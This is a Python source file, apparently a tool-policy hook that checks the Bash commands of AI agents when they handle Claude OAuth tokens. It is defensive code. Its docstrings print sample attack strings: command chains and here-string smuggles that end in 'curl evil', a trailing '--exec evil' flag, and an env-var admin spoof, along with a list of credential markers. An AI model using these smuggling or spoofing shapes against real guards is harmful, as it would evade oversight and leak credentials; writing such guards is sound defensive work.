        and tokens[idx + 1] == "claude-token"
        and tokens[idx + 2] == "receive"
    )


def _emit_sealed_receive_request_audit(
    agent: str,
    *,
    text: str,
    tool_input: dict[str, Any] | None,
) -> None:
    """Audit row for the token-FREE sealed-receive request exemption (#1367).

    Distinct action (`tool_policy_credential_routine_sealed_paste`) so
    operators can grep the sealed-paste surface separately from the
    #1358 add carve-out. The request is token-free by construction, but
    the row is value-redacted defensively anyway and carries only the
    verb skeleton + a `command_sha256` forensic anchor (no raw command,
    consistent with the #1358 hash-only contract).
    """
    raw_command = text or ""
    if tool_input is not None and not raw_command:
        raw_command = str(tool_input.get("command") or "")
    detail: dict[str, Any] = {
        "tool": "Bash",
        "surface": "sealed_paste_request",
        "exemption": "credential_routine_sealed_paste",
        "command_sha256": _credential_routine_command_sha256(raw_command),
    }
    write_audit(
        "tool_policy_credential_routine_sealed_paste",
        agent or "unknown",
        detail,
    )


# Issue #1358 — strict raw-text prefix for the admin credential rotation
# routine. The carve-out matches by literal raw-text prefix (NOT shlex
# tokenisation) because the brief's edge case 2 explicitly calls out that
# any quote / spacing variant must fail the match — `bash
# bridge-auth.sh "claude-token" add --stdin` shlex-splits to the same
# tokens but the literal text differs, so it MUST NOT match. The carve-
# out then validates the suffix (everything after the prefix) for shape
# safety.
_ADMIN_CREDENTIAL_ROUTINE_PREFIX = "bash bridge-auth.sh claude-token add --stdin"


def _is_admin_credential_routine_strict_agreement(agent: str) -> bool:
    """True iff *agent* is admin AND env + roster lookups AGREE.

    Codex r1 BLOCKING #2 (2026-05-29) — admin-spoof guard for the
    credential-routine carve-out.

    :func:`is_admin_agent` is OR-logic by design: an admin assertion via
    EITHER ``BRIDGE_ADMIN_AGENT_ID`` env match OR ``SESSION-TYPE.md ==
    admin`` is enough. That OR is correct for most admin surfaces
    (config wrappers, roster reads, etc.) because either signal alone
    is a high-trust assertion in that context — losing one would
    over-deny admin diagnostics.

    The credential-routine carve-out is different. It exempts a
    sanctioned shape from the credential-substring deny, so a single
    spoofed env var (or a stale SESSION-TYPE.md file from a previous
    role) can silently widen the carve-out to a non-admin caller.
    Direct repro: ``BRIDGE_ADMIN_AGENT_ID=user-1358`` exported into a
    non-admin agent's session would have flipped
    :func:`is_admin_agent` True and bypassed the substring deny without
    any roster confirmation.

    This stricter predicate requires BOTH:

    1. ``BRIDGE_ADMIN_AGENT_ID`` is set (non-empty) AND equals *agent*
       — env-asserted admin.
    2. ``SESSION-TYPE.md`` for that agent's home reads
       ``session type: admin`` — roster confirms admin.

    Disagreement (env says admin, roster says otherwise; or roster
    says admin, env unset / different agent) fails closed. The
    existing OR predicate is preserved for non-credential surfaces;
    only :func:`_is_admin_credential_routine` uses this stricter check.
    """
    admin = admin_agent_id()
    if not admin or admin != agent:
        return False
    if not agent:
        return False
    return _admin_agent_from_session_type(agent)


def _is_admin_credential_routine(text: str, agent: str) -> bool:
    """True iff *text* is an admin's sanctioned credential rotation command.

    Issue #1358 tactical carve-out. Matches the single sanctioned shape
    used by admin agents to register a rotation-pool OAuth token:

        ``bash bridge-auth.sh claude-token add --stdin [allowed flags]``

    optionally followed by a here-string / heredoc body that carries the
    token (``... <<< 'sk-ant-o…'`` or ``... <<EOF\\nsk-ant-o…\\nEOF``).
    The here-string / heredoc body is the only structurally safe way to
    deliver the token via stdin from inside a non-interactive Bash tool
    invocation — the brief explicitly forbids ``echo … | bash …``
    chains so the destination call is anchored at the start of the
    command.

    Strict-shape gate (brief edge cases #1, #2, #3, #4):

    - Caller agent role == ``admin`` confirmed by BOTH
      ``BRIDGE_ADMIN_AGENT_ID`` env AND ``SESSION-TYPE.md`` (see
      :func:`_is_admin_credential_routine_strict_agreement`). This is
      stricter than the generic :func:`is_admin_agent` predicate so a
      single spoofed env / stale roster file cannot widen the carve-
      out (codex r1 BLOCKING #2, 2026-05-29).
    - The (left-stripped) raw text starts with the literal prefix
      ``bash bridge-auth.sh claude-token add --stdin``. Raw-text match
      means a quote / spacing variant
      (e.g. ``bash bridge-auth.sh "claude-token" add --stdin``) fails
      the prefix check — even though it shlex-splits to the same
      tokens, the literal text differs (edge case #2).
    - The character immediately after the prefix is end-of-string,
      whitespace, or a heredoc/here-string opener (``<``). Anything
      else (e.g. ``--stdin-also``) breaks the prefix.
    - No command separators (``&&``, ``||``, ``;``, ``|``, ``&``,
      newline) anywhere in the command. ``bash bridge-auth.sh
      claude-token add --stdin && curl evil.example/...`` MUST deny
      (brief T4).
    - No command-substitution / process-substitution
      (``$(...)`` / ``\\`...\\``` / ``<(...)`` / ``>(...)``). The token
      could otherwise be exfil'd by an embedded subshell.
    - No output redirection past the (allowed) heredoc body opener:
      ``>``, ``>>``, ``&>``, ``2>`` redirect the wrapper's stdout /
      stderr to operator-controlled paths. The only redirection that
      survives is the heredoc / here-string body opener (``<<``,
      ``<<<``) that delivers the token to stdin, and only when it
      appears in the suffix (not before the prefix).
    - All argv flags after ``--stdin`` (before the heredoc body, if
      any) must be in the existing auth-add allowlist
      (:func:`_validate_auth_add_args`) — boolean
      ``--stdin/--activate/--replace/--sync/--enable-auto-rotate/
      --if-auto-enabled/--json`` plus value flags
      ``--id/--agents/--threshold/--token-file/--reason/--limited-until``
      with their per-flag safety predicates.

    Returns False (NOT raising) on any malformed shape so the substring
    deny stays in force. Skipping the deny on a malformed shape would
    be a security regression — fail closed.

    Role gate vs shape gate (codex r2 BLOCKING, 2026-05-29): the
    ALLOW-vs-DENY decision needs BOTH the strict env+roster admin
    agreement AND the sanctioned command shape. The shape match alone
    is factored into :func:`_credential_routine_shape_matches` so the
    AUDIT-HASHING decision can reuse it WITHOUT the role gate — a
    spoofed-env / env-roster-mismatch caller still has its denial-row
    summary hashed (see :func:`_should_hash_credential_routine_audit`)
    even though the carve-out correctly denies the command.
    """
    if not _is_admin_credential_routine_strict_agreement(agent):
        return False
    return _credential_routine_shape_matches(text)


def _credential_routine_shape_matches(text: str) -> bool:
    """True iff *text* matches the sanctioned credential-routine SHAPE.

    Shape-only gate — NO role / admin / env-roster check. Factored out
    of :func:`_is_admin_credential_routine` (codex r2 BLOCKING,
    2026-05-29) so two callers can share the exact same shape match:

    - :func:`_is_admin_credential_routine` ANDs this with the strict
      env+roster admin agreement to decide ALLOW vs DENY of the
      substring-deny carve-out.
    - :func:`_should_hash_credential_routine_audit` uses this ALONE to
      decide whether an audit row's command summary must be hashed.
      A command whose shape matches the credential routine carries an
      OAuth token in its here-string / heredoc body even when the
      caller is NOT admin (env-roster mismatch, spoofed env). In that
      case the carve-out denies (correct) but the generic
      ``agent_tool_denied`` / ``agent_tool_use`` row would otherwise
      persist the raw token in ``detail.summary.command``. Hashing the
      audit summary on shape match alone — independent of the role
      gate — closes that leak (fail closed: hash whenever the token-
      bearing shape is present).

    The full shape contract is documented on
    :func:`_is_admin_credential_routine`. Returns False (NOT raising)
    on any malformed shape.
    """
    if not text:
        return False
    stripped = text.lstrip()
    if not stripped.startswith(_ADMIN_CREDENTIAL_ROUTINE_PREFIX):
        return False
    # The character immediately following the literal prefix must not
    # extend the token — `--stdin-also` or `--stdinfoo` would otherwise
    # squat the prefix.
    after_prefix = stripped[len(_ADMIN_CREDENTIAL_ROUTINE_PREFIX):]
    if after_prefix and after_prefix[0] not in (" ", "\t", "<"):
        return False
    # Reject command-substitution / process-substitution everywhere in
    # the command. The heredoc opener `<<` and here-string opener
    # `<<<` are the only `<<` forms we allow; they are explicitly
    # checked below after we strip them from the "scan for redirect"
    # surface.
    if re.search(r"\$\(", text) or "`" in text:
        return False
    if re.search(r"<\(", text) or re.search(r">\(", text):
        return False
    # Reject command separators. Command separators inside a single-
    # quoted heredoc body do not introduce a new shell stage, but the
    # heredoc body itself can carry the token — `_COMMAND_OPERATOR_RE`
    # does not know about heredoc bodies. Strip the heredoc / here-
    # string body from the scan surface so a `;` inside the token
    # value cannot fail us. The carve-out only spans a single shell
    # command; the heredoc body is data, not control.
    scan = _strip_heredoc_and_herestring_body(text)
    if _COMMAND_OPERATOR_RE.search(scan):
        return False
    # Reject output redirection on the scan surface (post heredoc-body
    # strip). The heredoc opener `<<` and here-string opener `<<<`
    # remain on the scan surface as ``<``-bearing tokens, so the bare
    # `<` / `>` substring check would over-reject. Apply
    # `_NUMERIC_FD_WRITE_RE` per whitespace-token and a stricter
    # bare-`>` check that excludes the heredoc body opener context.
    if _scan_has_output_redirect(scan):
        return False
    # Validate the argv portion (after the prefix) against the existing
    # auth-add allowlist. Codex r3 BLOCKING (2026-05-29): the previous
    # check cut argv at the FIRST heredoc/here-string opener, so a
    # trailing `<<< 'token' --exec evil` shape was allowed because
    # `--exec evil` slid past `_validate_auth_add_args`. Fix: strip the
    # heredoc/here-string body+opener+delimiter from the body-stripped
    # scan surface, then validate the remaining whitespace-separated
    # argv against the allowlist. Both pre-body and post-body flags
    # flow through `_validate_auth_add_args`, so a trailing `--exec
    # evil` after the here-string now denies.
    scan_stripped = scan.lstrip()
    if not scan_stripped.startswith(_ADMIN_CREDENTIAL_ROUTINE_PREFIX):
        # The body strip shouldn't move the prefix, but if a future
        # heredoc-redaction edit accidentally clips the prefix we
        # fail closed.
        return False
    scan_after_prefix = scan_stripped[len(_ADMIN_CREDENTIAL_ROUTINE_PREFIX):]
    suffix_argv = _admin_routine_argv_suffix(scan_after_prefix)
    if suffix_argv is None:
        return False
    suffix_argv = _SAFE_REDIRECT_RE.sub(" ", suffix_argv)
    try:
        tokens = shlex.split(suffix_argv, posix=True, comments=False)
    except ValueError:
        return False
    # `_validate_auth_add_args` validates the flags after `add --stdin`.
    # The suffix_argv contains every non-heredoc/non-here-string flag
    # after `bash bridge-auth.sh claude-token add --stdin`. `--stdin`
    # itself was already consumed by the prefix.
    if not _validate_auth_add_args(tokens):
        return False
    return True


def _should_hash_credential_routine_audit(text: str) -> bool:
    """True iff an audit row for *text* must carry a hash-only command summary.

    Codex r2 BLOCKING (2026-05-29) — env-roster-mismatch deny path leaks
    the token in the audit row.

    Direct repro at head c3dd96e: a non-admin / env-roster-mismatch
    caller running ``bash bridge-auth.sh claude-token add --stdin --id
    pool-a <<< 'sk-ant-o…'`` is correctly DENIED by the substring guard
    (``_is_admin_credential_routine`` returns False because the strict
    env+roster admin agreement fails). But the generic
    ``agent_tool_denied`` audit row's summary scrub was gated on the
    SAME ``_is_admin_credential_routine`` predicate, so the scrub did
    NOT fire and ``detail.summary.command`` persisted the raw token in
    clear.

    Decoupling the two decisions:

    - ``_is_admin_credential_routine`` (role gate AND shape gate)
      controls ALLOW vs DENY of the substring-deny carve-out.
    - This predicate (shape gate ONLY, via
      :func:`_credential_routine_shape_matches`) controls AUDIT
      HASHING. It returns True for ANY command whose shape matches the
      sanctioned credential routine — regardless of admin / role /
      env-roster agreement — because such a command carries an OAuth
      token in its here-string / heredoc body whether or not the
      caller is a verified admin. Hashing the audit summary on shape
      match alone is fail-closed: the token never lands in the audit
      log on either the ALLOW (exempted) path or the DENY (carve-out
      refused) path.
    """
    return _credential_routine_shape_matches(text)


def _bash_audit_summary_needs_hashing(text: str) -> bool:
    """True iff a Bash command's audit summary must be hashed (not raw).

    Codex r2 BLOCKING (r3, 2026-05-29, #1358) — broader leak. The
    sanctioned-routine shape (:func:`_should_hash_credential_routine_audit`)
    is NOT the only Bash command whose audit summary can carry a Claude
    OAuth token. ``_raw_mentions_claude_credentials`` denies ANY Bash
    text containing one of the five credential markers (``sk-ant-o``,
    ``.credentials.json`` + ``.claude``, ``CLAUDE_CODE_OAUTH_TOKEN``,
    ``launch-secrets.env``, ``claude-oauth-tokens.json``) — e.g. a bare
    ``echo sk-ant-o-…`` from any agent. That command is denied, but the
    ``agent_tool_denied`` row's ``detail.summary.command`` previously
    persisted the raw token because the scrub only fired on the
    sanctioned routine shape.

    Hash the Bash audit summary whenever EITHER condition holds:

    1. the command matches the sanctioned credential-routine shape
       (:func:`_should_hash_credential_routine_audit`); or
    2. the command's raw text carries any Claude credential marker
       (:func:`_raw_mentions_claude_credentials`).

    Fail-closed: any credential-bearing Bash command — sanctioned shape
    or not, allowed or denied — gets a hash-only audit summary so the
    token never lands in the audit log. Non-credential commands keep
    their raw forensic ``command`` summary.
    """
    return (
        _should_hash_credential_routine_audit(text)
        or _raw_mentions_claude_credentials(text)
    )


def _strip_heredoc_and_herestring_body(text: str) -> str:
    """Return *text* with the heredoc and here-string BODY removed.

    Keeps the heredoc / here-string opener (``<<EOF``, ``<<<``) so the
    redirect-scan can still see the structural marker, but drops the
    token-carrying body. Used by :func:`_is_admin_credential_routine`
    so a quoted ``;`` or ``|`` inside the token never fails the
    command-separator scan.

    Codex r2 BLOCKING (2026-05-29): the previous bare-word here-string
    strip used ``\\S+`` which greedily swallowed shell separators
    (``\\S`` includes ``;`` / ``|`` / ``&``) — so
    ``<<< sk-ant-o-abc;curl evil`` shipped ``;curl`` into the body and
    falsely passed the separator scan. Two fixes:

    1. **Bare-word here-string bodies are NOT stripped.** Bash itself
       terminates an unquoted here-string body at the first shell
       metachar, so a bare-word body that contains a separator IS a
       smuggling vector — the trailing ``;curl …`` would actually
       execute. Leave the bare-word form on the scan surface so the
       command-operator check downstream rejects it. The carve-out
       therefore only sanctions QUOTED here-strings
       (``<<< 'sk-ant-o…'`` / ``<<< "sk-ant-o…"``), which is the only
       structurally safe shape.
    2. **Heredoc body terminator is the FIRST line equal to the
       delimiter** (not the last). The previous lazy ``.*?\\n\\3$``
       anchored to the END of string, so a multi-``EOF`` payload
       (``<<EOF\\nbody\\nEOF\\ncurl evil\\nEOF``) coalesced into a
       single "body" that hid the ``curl evil`` separator. The new
       regex requires the delimiter to appear on its own line, which
       matches bash semantics.

    Multiple heredocs in a single command are vanishingly rare in
    this carve-out's domain and are intentionally not supported —
    the carve-out spans a single credential routine invocation only.
    """
    # Strip here-string QUOTED body only:
    #   `... <<< 'sk-ant-o…'` -> `... <<<`
    #   `... <<< "sk-ant-o…"` -> `... <<<`
    # Bare-word `<<< sk-ant-o-abc;curl evil` is deliberately NOT
    # matched so the trailing separator + smuggled command reaches the
    # downstream command-operator scan and trips the deny.
    text = re.sub(
        r"(<<<)\s*('(?:\\.|[^'\\])*'|\"(?:\\.|[^\"\\])*\")",
        r"\1",
        text,
    )
    # Strip heredoc body: `... <<EOF\n<token>\nEOF[\s]*$` -> `... <<EOF`
    # The terminator is the FIRST line whose contents (alone) equal
    # the delimiter — matches bash heredoc semantics and prevents a
    # multi-EOF payload from coalescing into one body. Implemented
    # with a negative look-ahead inside `.*?` that rejects any
    # in-body line equal to the delimiter. After the closing
    # delimiter we ONLY consume optional trailing WHITESPACE and
    # require end-of-string — codex r5 2026-05-29 found that
    # consuming ``(?:\\n|$)`` instead let a post-EOF line whose
    # content was an allowlisted auth flag (``--activate`` /
    # ``--enable-auto-rotate`` etc.) slide past
    # ``_validate_auth_add_args`` because the strip ate the line
    # separator. Anchoring to ``\\s*$`` forces the heredoc to be the
    # last thing in the command; any post-EOF non-whitespace content
    # leaves the regex unmatched, the body stays on the scan surface,
    # and ``_COMMAND_OPERATOR_RE`` denies on the embedded newlines.
    text = re.sub(
        r"(<<-?)\s*(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\2"
        r"\n((?:(?!\3\n)(?!\3$).)*?)"
        r"\n\3\s*\Z",
        r"\1\3",
        text,
        flags=re.DOTALL,
    )
    return text


def _scan_has_output_redirect(scan: str) -> bool:
    """True iff *scan* contains an output redirection token (post heredoc
    body strip).

    The heredoc opener `<<` and here-string opener `<<<` remain on the
    scan surface as `<`-bearing tokens — the bare `<` substring check
    would over-reject. Strip those tokens first, then reject any
    remaining `<`, `>`, `>>`, `&>`, numeric-fd-prefixed redirect
    (`1>`, `2>`).
    """
    # Drop the safe `2>/dev/null` etc. forms first.
    sanitized = _SAFE_REDIRECT_RE.sub(" ", scan)
    # Drop heredoc / here-string opener — the literal `<<`-bearing
    # token cannot redirect the wrapper's output.
    sanitized = re.sub(r"<<-?<?", " ", sanitized)
    # Any remaining `<` or `>` (incl. `&>`, `2>`, `1>`, etc.) is a
    # real redirection target on the wrapper's stdout/stderr/stdin.
    return "<" in sanitized or ">" in sanitized


def _admin_routine_argv_suffix(after_prefix: str) -> str | None:
    """Return the suffix argv with any heredoc/here-string envelope
    (opener + body placeholder + delimiter) fully removed.

    Codex r3 BLOCKING (2026-05-29): the previous helper cut argv at
    the FIRST heredoc/here-string opener, so trailing argv flags after
    the body slipped past `_validate_auth_add_args`. This helper now
    strips the entire heredoc/here-string envelope so the residue —
    whatever flags appear BEFORE and AFTER the body — gets validated
    together by the existing allowlist.

    Caller passes the post-prefix slice of the BODY-STRIPPED scan
    surface (the one produced by
    :func:`_strip_heredoc_and_herestring_body`), NOT the raw text.
    That way:

    - Quoted here-string ``<<< 'body'`` / ``<<< "body"`` already has
      its body stripped, leaving ``<<<`` on the scan; we drop the
      operator.
    - Bare-word here-string ``<<< body`` is NOT stripped by the body
      strip (deliberately — bash terminates the body at shell
      metachars, so a smuggled separator would have already failed
      the separator scan upstream). It still appears on the scan
      surface and the caller's separator scan rejected it.
    - Heredoc ``<<EOF\\nbody\\nEOF`` has its body+closer stripped by
      the body-strip step (substitution `\\1\\3` leaves just
      ``<<EOF`` on the scan); we drop the opener+delimiter.

    Returns None on malformed shape (no whitespace after prefix when
    the suffix is non-empty and not a heredoc/here-string opener).
    """
    if not after_prefix:
        return ""
    # If the first non-prefix char is a heredoc/here-string opener,
    # the operator opted out of any pre-body flag — that's allowed.
    # Otherwise the first char must be whitespace.
    if after_prefix[0] != "<" and after_prefix[0] not in (" ", "\t"):
        return None
    # Drop quoted here-string operator (body already removed by the
    # body-strip pass).
    text = re.sub(r"<<<", " ", after_prefix)
    # Drop heredoc opener+delimiter (body+closer already removed by
    # the body-strip pass). Match `<<EOF`, `<<-EOF` variants.
    text = re.sub(r"<<-?[A-Za-z_][A-Za-z0-9_]*", " ", text)
    return text.strip()


def _admin_bridge_verb_check(
    text: str,
    agent: str,
    tool_input: dict[str, Any] | None,
) -> tuple[bool, str | None]:
    """Anchored bridge-verb allowlist (issue #6607 / codex r1).

    Returns ``(allowed, deny_reason)``:
    - ``(True, None)``: the command matches one of the three allowed verb
      shapes, the caller's role is permitted, and any safe-path argument
      validates. An audit row has already been emitted. Caller returns
      ``None`` (allow).
    - ``(False, str)``: the verb shape was recognized but the caller's
      role is not permitted (e.g. non-admin attempting
      ``auth claude-token add``) OR a path argument failed validation
      (e.g. ``--body-file ../../secret``). Caller returns the deny reason
      so an explicit deny is produced rather than falling through to the
      peer/shared gate (where a traversal path that doesn't happen to
      reference a peer home would otherwise be silently allowed).
    - ``(False, None)``: the command is not a recognized bridge-verb
      invocation. Caller falls through to the normal non-admin gates.

    All three negative branches in the defense block return
    ``(False, None)`` because a command that is not structurally a single
    safe ``agent-bridge``/``agb`` invocation has no business being
    matched here — let it run through the regular gates.
    """
    if _command_has_shell_embedding(text):
        return False, None
    sanitized = _SAFE_REDIRECT_RE.sub(" ", text)
    if "<" in sanitized or ">" in sanitized:
        return False, None
    if _COMMAND_OPERATOR_RE.search(sanitized):
        return False, None
    try:
        tokens = shlex.split(sanitized, posix=True, comments=False)
    except ValueError:
        return False, None
    if len(tokens) < 2:
        return False, None
    leaf = tokens[0].rsplit("/", 1)[-1]
    if leaf not in {"agent-bridge", "agb"}:
        return False, None

    admin = is_admin_agent(agent)
    verb = tokens[1]

    if verb == "auth":
        # `auth claude-token (add|activate|sync|rotate|receive) ...`
        if len(tokens) < 4 or tokens[2] != "claude-token":
            return False, None
        sub = tokens[3]
        if sub not in {"add", "activate", "sync", "rotate", "receive"}:
            return False, None
        if not admin:
            return False, (
                "agent-bridge auth claude-token is admin-only; "
                "non-admin agents must request token rotation through admin"
            )
        rest = tokens[4:]
        if sub == "add":
            if not _validate_auth_add_args(rest):
                return False, "agent-bridge auth claude-token add: unsafe arguments"
        elif sub == "activate":
            if not rest or not _safe_slug_arg(rest[0]):
                return False, "agent-bridge auth claude-token activate: unsafe id"
            if not _validate_auth_flags(rest[1:]):
                return False, "agent-bridge auth claude-token activate: unsafe arguments"
        elif sub == "receive":
            # #1367 — sealed-paste. The ONLY agent-runnable shape is the
            # token-FREE request/receipt (`receive --request … --json`).
            # The token-accepting receive form reads echo-off from the
            # operator's tty and must NOT be drivable from an agent Bash
            # tool — so anything that is not the strict token-free request
            # shape is denied here.
            if not _sealed_receive_request_shape_matches(text):
                return False, (
                    "agent-bridge auth claude-token receive: only the "
                    "token-free `--request ... --json` shape is permitted "
                    "from an agent; the token-accepting receive must be run "
                    "by the operator from a terminal"
                )
            _emit_sealed_receive_request_audit(
                agent,
                text=text,
                tool_input=tool_input,
            )
            return True, None
        else:  # sync, rotate
            if not _validate_auth_flags(rest):
                return False, f"agent-bridge auth claude-token {sub}: unsafe arguments"
        _emit_admin_bridge_verb_audit(
            agent,
            text=text,
            tool_input=tool_input,
            verb_path=("auth", "claude-token", sub),
        )
        return True, None

    if verb == "escalate":
        # `escalate question ...` — both roles. Question body is free text;
        # the credential/env/protected-path gates above (which run before
        # us) have already rejected secret-bearing text.
        if len(tokens) < 3 or tokens[2] != "question":
            return False, None
        _emit_admin_bridge_verb_audit(
            agent,
            text=text,
            tool_input=tool_input,
            verb_path=("escalate", "question"),
        )
        return True, None

    if verb == "a2a":
        # `a2a send ...` with optional `--body-file <safe-path>`.
        if len(tokens) < 3 or tokens[2] != "send":
            return False, None
        body_file = _extract_flag_value(tokens[3:], "--body-file")
        if body_file is _FLAG_MALFORMED:
            # codex r1 (PR #1243): `--body-file` alone, `--body-file
            # --to peer`, and `--body-file /tmp/ok --body-file
            # ../../secret` all reach here. Emit a distinct
            # `_denied_shape` audit row (NOT the `_allowed` row) so
            # operators can grep smuggling attempts and so the smoke
            # counter-proofs can pin the deny shape.
            _emit_admin_bridge_verb_denied_shape_audit(
                agent,
                text=text,
                tool_input=tool_input,
                verb_path=("a2a", "send"),
                reason="malformed_or_duplicate_body_file",
            )
            return False, (
                "agent-bridge a2a send: malformed --body-file "
                "(missing value, smuggled flag, or duplicate)"
            )
        if body_file is not _FLAG_ABSENT and not _safe_path_arg(body_file):
            return False, (
                "agent-bridge a2a send: unsafe --body-file path "
                "(path traversal / shell metachar / empty)"
            )
        _emit_admin_bridge_verb_audit(
            agent,
            text=text,
            tool_input=tool_input,
            verb_path=("a2a", "send"),
        )
        return True, None

    return False, None


# Flag names accepted by `agent-bridge auth claude-token <sub>` family.
# `bridge-auth.sh` --help lists the full set; we accept the same surface
# plus a small set of common boolean / value flags. Anything outside
# this allowlist triggers `_validate_auth_*` to reject — the goal is to
# anchor the verb shape so an operator cannot smuggle a `--exec`-style
# extension flag through later.
_AUTH_FLAGS_BOOL = frozenset(
    {
        "--stdin",
        "--activate",
        "--replace",
        "--sync",
        "--enable-auto-rotate",
        "--if-auto-enabled",
        "--json",
    }
)
# Flags that take a value (separated `--flag VALUE` OR packed `--flag=VALUE`).
# The value must satisfy a per-flag safety check:
#   - paths → `_safe_path_arg`
#   - slug/id-ish values → `_safe_slug_arg`
#   - free text reason → only metachar-free strings
_AUTH_FLAGS_PATH = frozenset({"--token-file"})
_AUTH_FLAGS_SLUG = frozenset(
    {
        "--id",
        "--agents",
        "--threshold",
    }
)
_AUTH_FLAGS_REASON = frozenset({"--reason"})
# `rotate --limited-until <ISO>` (#1789 / PR #1790): the rotating-away
# token's 429 reset time. Timestamp only — `_safe_slug_arg` rejects the
# `:`/`+` an ISO offset carries, so it gets its own strict shape check
# (date-time with optional fraction and Z / ±HH:MM offset, nothing else).
_AUTH_FLAGS_ISO = frozenset({"--limited-until"})
_AUTH_ISO_TS_RE = re.compile(
    r"^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:\d{2})?$"
)
_AUTH_FLAGS_VALUE = (
    _AUTH_FLAGS_PATH | _AUTH_FLAGS_SLUG | _AUTH_FLAGS_REASON | _AUTH_FLAGS_ISO
)


def _validate_auth_add_args(tokens: list[str]) -> bool:
    """`auth claude-token add` accepts boolean flags + the value flags
    in `_AUTH_FLAGS_*`. Positional args are not permitted.
    """
    return _validate_auth_flags(tokens)


def _validate_auth_flags(tokens: list[str]) -> bool:
    """Walk `tokens` accepting only flags listed in `_AUTH_FLAGS_*`.

    Rejects any positional argument (anything not starting with ``--``).
    Rejects unknown flags so we don't accidentally absorb a future
    ``--exec`` / ``--hook`` flag added to the wrapper. Validates each
    value flag's argument with its per-flag predicate.
    """
    idx = 0
    n = len(tokens)
    while idx < n:
        tok = tokens[idx]
        if tok in _AUTH_FLAGS_BOOL:
            idx += 1
            continue
        if tok in _AUTH_FLAGS_VALUE:
            if idx + 1 >= n:
                return False
            value = tokens[idx + 1]
            if not _validate_auth_flag_value(tok, value):
                return False
            idx += 2
            continue
        # Packed `--flag=value` form.
        if tok.startswith("--") and "=" in tok:
            flag, value = tok.split("=", 1)
            if flag in _AUTH_FLAGS_VALUE:
                if not _validate_auth_flag_value(flag, value):
                    return False
                idx += 1
                continue
            # Packed form of a boolean flag (`--stdin=anything`) is malformed.
            return False
        # Positional / unknown flag — reject.
        return False
    return True


def _validate_auth_flag_value(flag: str, value: str) -> bool:
    if flag in _AUTH_FLAGS_PATH:
        return _safe_path_arg(value)
    if flag in _AUTH_FLAGS_SLUG:
        return _safe_slug_arg(value)
    if flag in _AUTH_FLAGS_ISO:
        return bool(_AUTH_ISO_TS_RE.match(value))
    if flag in _AUTH_FLAGS_REASON:
        # Free-text reason: only reject shell metacharacters.
        if not value:
            return False
        return not any(ch in _PATH_METACHAR_CHARS for ch in value)
    return False


# Issue #1806 — admin cross-agent WRITE audit row. Mirrors
# `emit_system_cross_agent_read` (the cross-agent READ ledger) so the
# operator retains a full ledger of admin peer-home WRITES the guard now
# allows. `action == "admin_cross_agent_write"` is the grep anchor.
def emit_admin_cross_agent_write(
    *,
    agent: str,
    operation: str,
    resolved_source: str,
    resolved_target: str,
    target_agent: str,
    command: str,
) -> None:
    write_audit(
        "admin_cross_agent_write",
        agent or "unknown",
        {
            "agent": agent or "unknown",
            "operation": operation,
            "resolved_source": resolved_source,
            "resolved_target": resolved_target,
            "target_agent": target_agent,
            "command": truncate_text(command, 240),
            "tool": "Bash",
        },
    )


def _resolve_word_through_symlinks(word: str) -> Path | None:
    """Resolve a single absolute path *word* through symlinks + ``..``,
    tolerating a not-yet-existing leaf.

    Returns the resolved ``Path`` or ``None`` when the word is not a clean,
    statically-modelable absolute path. Fails closed (returns ``None``) on:
    any unresolved expansion (`$VAR`/`~`/brace), a glob/command-sub, a
    relative path (cwd unmodeled here), or a resolution error.

    For a not-yet-existing target the deepest EXISTING ancestor is resolved
    through symlinks first, so a symlinked PARENT that escapes a containment
    root is caught; the remaining leaf components are then re-appended to that
    resolved base. ``..`` is folded by ``Path.resolve``.
    """
    w = word.strip()
    if not w:
        return None
    if _has_unresolved_path_expansion(w):
        return None
    if any(ch in w for ch in _OBFUSCATION_GLOB_CHARS):
        return None
    if "$(" in w or "`" in w or "${" in w:
        return None
    try:
        candidate = Path(w).expanduser()
    except (ValueError, OSError):
        return None
    if not candidate.is_absolute():
        return None
    try:
        existing = candidate
        tail_parts: list[str] = []
        while not existing.exists():
            parent = existing.parent
            if parent == existing:
                return None  # walked past the filesystem root
            tail_parts.append(existing.name)
            existing = parent
        resolved = existing.resolve(strict=False)
    except (OSError, RuntimeError):
        return None
    for name in reversed(tail_parts):
        resolved = resolved / name
    return resolved


def _path_in_forbidden_tree(resolved: Path) -> bool:
    """True iff *resolved* is — or sits under — shared/private, shared/secrets,
    or a #341 protected-config path. The hard-denied trees that stay off-limits
    even for an admin contained-write carve-out."""
    shared_root = bridge_home_dir() / "shared"
    rel_shared = _resolve_under(resolved, shared_root)
    if rel_shared is not None:
        rel_str = rel_shared.as_posix()
        if rel_str != "." and any(
            rel_str == forbidden.rstrip("/") or rel_str.startswith(forbidden)
            for forbidden in _SHARED_FORBIDDEN_PREFIXES
        ):
            return True
    return bool(is_protected_path(resolved))


def _admin_read_expansion_provably_safe(text: str, agent: str) -> list[tuple[str, str]] | None:
    """Issue #1806 (3b/3c) — prove a trusted-admin read-intent command whose
    only blocker is an expansion / glob fail-close is SAFE, and return the
    peer-home references to audit.

    The fail-close exists because a `~`/`$VAR`/glob spelling hides a path from
    the static analyzers (#1690 r4). For a STRICT trusted-admin we may downgrade
    that fail-close to allow+audit, but ONLY when we can still PROVE the command
    cannot resolve into a forbidden tree:

      1. Stage A's resolved-path forbidden check already ran upstream and did
         NOT fire (else the function returned), so the command provably does not
         resolve into shared/private or shared/secrets via any spelling/`..`.
      2. Here we additionally expand the bridge-KNOWN prefixes
         (`~`/`$HOME`/`$BRIDGE_HOME`) in every path word and require that NO
         word retains an unresolved `$`-expansion AND NO word carries a glob
         (`* ? [ ]`) or command-sub — an un-modelable word is never provably
         safe (fail closed → return ``None`` → the caller keeps the deny).
      3. Each fully-resolved word is re-checked against the forbidden trees and
         #341 protected-config; any hit → ``None`` (deny).

    Returns the list of ``(resolved_path, peer_agent)`` for words that resolve
    into a peer home (for the audit ledger), or ``None`` when the command is
    not provably safe. An empty list (no peer-home reference) also returns
    ``None`` so a non-peer expansion read is not mis-audited and instead falls
    through to its normal handling.
    """
    # Per-word safety: split into shell words (expansion-aware) and inspect.
    try:
        words = _shell_words_with_expansion(text)
    except ValueError:
        return None
    peer_homes = other_agent_homes(agent)
    peer_refs: list[tuple[str, str]] = []
    for raw_word, shell_expanded in words:
        if not raw_word:
            continue
        # A command-substitution / backtick / surviving non-bridge `$var`
        # word the shell would rewrite is un-modelable → fail closed.
        if shell_expanded:
            return None
        if any(ch in raw_word for ch in _OBFUSCATION_GLOB_CHARS):
            return None
